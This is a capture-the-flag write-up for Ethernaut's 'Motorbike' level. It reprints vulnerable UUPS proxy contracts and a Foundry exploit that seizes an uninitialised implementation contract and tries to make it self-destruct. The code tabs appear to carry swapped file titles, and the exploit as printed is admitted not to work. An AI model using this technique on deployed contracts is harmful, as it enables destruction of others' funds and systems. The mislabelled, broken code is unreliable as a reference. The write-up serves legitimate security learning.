# Level 25 - Motorbike ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/25" %}

### Level Setup

{% hint style="info" %}
Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

Things that might help:

* [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
* [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
* [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Motorbike.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-25

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-25

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/09fcb69b4dd3a7ec05017ff17f3d0f09b85a740a/src/Level25.sol" %}

{% code title="src/Level25.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level25.sol";

// ================================================================
// │                       LEVEL 25 - MOTORBIKE                   │
// ================================================================
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function destroyEngine() external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();

        // Replace the slot number with the specific storage slot you want to read
        bytes32 storageSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        // Use the load cheatcode to get the value at the storage slot
        bytes32 value = vm.load(targetContractAddress, storageSlot);

        IEngine engine = IEngine(address(uint160(uint256(value))));

        engine.initialize();

        // **************************************************************************************
        // This no longer works because SELFDESTRUCT only works in the constructor of a contract
        // **************************************************************************************
        AttackContract attackContract = new AttackContract();
        engine.upgradeToAndCall(address(attackContract), abi.encodeWithSignature("destroyEngine()"));

        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/09fcb69b4dd3a7ec05017ff17f3d0f09b85a740a/script/Level25.s.sol" %}

{% code title="script/Level25.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// ================================================================
// │                       LEVEL 25 - MOTORBIKE                   │
// ================================================================
contract AttackContract {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Can't be completed right now since `selfdestruct()` only works in the constructor.
{% endhint %}

### Notes

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_25_Motorbike.md" %}
